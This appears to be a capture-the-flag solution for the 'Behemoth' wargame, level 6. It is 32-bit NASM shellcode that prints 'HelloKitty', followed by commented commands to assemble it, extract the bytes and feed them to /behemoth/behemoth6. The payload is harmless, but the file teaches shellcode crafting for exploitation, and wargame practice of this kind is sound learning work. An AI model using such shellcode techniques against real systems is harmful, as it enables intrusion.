BITS 32

global _start
section .text

_start:
	jmp _str 
_write:
	mov edx, 10
	pop ecx
	mov ebx, 1
	mov eax, 4
	int 0x80

	xor ebx, ebx
	mov eax, 1
	int 0x80

_str:
	call _write
	db 'HelloKitty'

;; nasm beh6.S -o shell.bin
;; hexdump -v -e '1/1 "\\"' -e '1/1 "x%02x"' shell.bin ; echo
;; perl -e 'print "\xeb\x1b\xba\x0a\x00\x00\x00\x59\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe0\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79"' > shellcode.txt & /behemoth/behemoth6